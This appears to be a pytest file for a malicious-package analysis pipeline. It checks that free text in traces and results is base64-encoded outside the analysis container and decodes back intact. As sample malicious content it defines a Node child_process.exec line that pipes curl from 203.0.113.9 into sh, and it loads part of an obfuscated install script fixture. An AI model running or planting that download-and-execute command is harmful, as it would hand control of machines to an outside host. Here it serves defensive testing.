"""Gate B0 2026-11-21: free text (model or package) is base64 before it leaves the analysis container."""

import json
from pathlib import Path

from experiments import encoding as enc

CODE = (Path(__file__).parent / "fixtures" / "packages" / "obfuscated-package" / "install.min.js").read_text(
    encoding="utf-8")[:1500]
LURE = "require('child_process').exec('curl http://203.0.113.9/x | sh')"
EVENTS = [
    {"type": "run_start", "model": "m", "config_name": "A-TLM", "max_steps": 15, "seq": 0},
    {"type": "thought", "text": f"The script runs {LURE}"},
    {"type": "tool_call", "tool": "search_code", "args": {"text": "child_process"}},
    {"type": "tool_result", "tool": "read_file", "ok": True, "summary": "OK", "data_preview": CODE, "untrusted": True},
    {"type": "verdict", "valid": True, "validation_errors": [],
     "verdict": {"label": "malicious", "confidence": 0.9, "description": LURE,
                 "behaviors": [{"behavior": "x", "analysis": LURE}]}},
    {"type": "decision", "threshold": 0.8, "final_label": "malicious", "final_action": "deny", "rule": "R1",
     "reasons": [LURE], "evidence_checks": [{"file": "a.js", "ok": True}], "inputs": {"flag": True}},
    {"type": "error", "kind": "bad_tool_call", "message": LURE},
    {"type": "run_end", "elapsed_s": 1.0, "steps": 3},
]
TEXT = "".join(json.dumps(event, ensure_ascii=False) + "\n" for event in EVENTS)
RESULT = {"package": "a@1.0.0", "variant": "A-TLM", "model": "m", "trace": "t.jsonl", "status": "ok", "steps": 3,
          "verdict": EVENTS[4]["verdict"], "errors": ["bad_tool_call"], "elapsed_s": 1.0,
          "decision": {"label": "malicious", "action": "deny", "rule": "R1", "reasons": [LURE]},
          "planned_command": ["npm", "deny-scripts", "a@1.0.0"], "container_peak_mb": 10.0, "error": LURE}


def test_trace_has_no_package_or_model_text_and_decodes_back():
    encoded = enc.encode_trace(TEXT)
    assert CODE[40:120] not in encoded and "child_process" not in encoded and "203.0.113.9" not in encoded
    assert not enc.trace_has_plain_text(encoded) and enc.trace_has_plain_text(TEXT)
    decoded = [enc.decode_fields(json.loads(line)) for line in encoded.splitlines()]
    assert decoded == EVENTS
    preview = json.loads(encoded.splitlines()[3])
    assert preview["data_preview_encoding"] == "base64" and "data_preview" not in preview  # format agreed 20/11


def test_result_keeps_scoring_fields_plain_and_decodes_back():
    encoded = enc.encode_result(RESULT)
    text = json.dumps(encoded)
    assert "child_process" not in text and "203.0.113.9" not in text
    assert encoded["status"] == "ok" and encoded["decision"]["label"] == "malicious"
    assert encoded["verdict_summary"] == {"label": "malicious", "confidence": 0.9, "action": None}
    assert not enc.result_has_plain_text(encoded) and enc.result_has_plain_text(RESULT)
    decoded = enc.decode_fields(encoded)
    assert {key: value for key, value in decoded.items() if key != "verdict_summary"} == RESULT


def test_old_plain_records_pass_through_and_read_events(tmp_path):
    assert enc.decode_fields(RESULT) == RESULT
    path = tmp_path / "t.jsonl"
    path.write_text(enc.encode_trace(TEXT), encoding="utf-8")
    assert enc.read_events(path) == EVENTS


def test_metrics_and_sweep_read_encoded_runs(tmp_path):
    from experiments.metrics import load_results, score
    from experiments.threshold_sweep import recorded
    (tmp_path / "a@1.0.0.json").write_text(json.dumps(enc.encode_result(RESULT)), encoding="utf-8")
    (tmp_path / "t.jsonl").write_text(enc.encode_trace(TEXT), encoding="utf-8")
    results = load_results(tmp_path)
    labels = [{"name": "a", "version": "1.0.0", "label": "malicious"}]
    assert score(results, labels)["binary"]["tp"] == 1
    verdict, checks, inputs = recorded(tmp_path / "t.jsonl")
    assert verdict["description"] == LURE and checks == [{"file": "a.js", "ok": True}] and inputs == {"flag": True}
